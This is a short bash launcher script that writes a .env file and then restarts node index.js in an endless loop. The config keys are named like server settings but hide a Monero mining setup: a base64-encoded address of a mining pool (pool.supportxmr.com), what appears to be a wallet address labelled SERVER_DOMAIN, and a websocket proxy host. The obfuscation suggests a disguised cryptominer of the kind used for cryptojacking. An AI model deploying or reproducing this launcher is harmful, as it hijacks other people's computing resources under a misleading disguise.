#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://cloud9one.biz.id
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
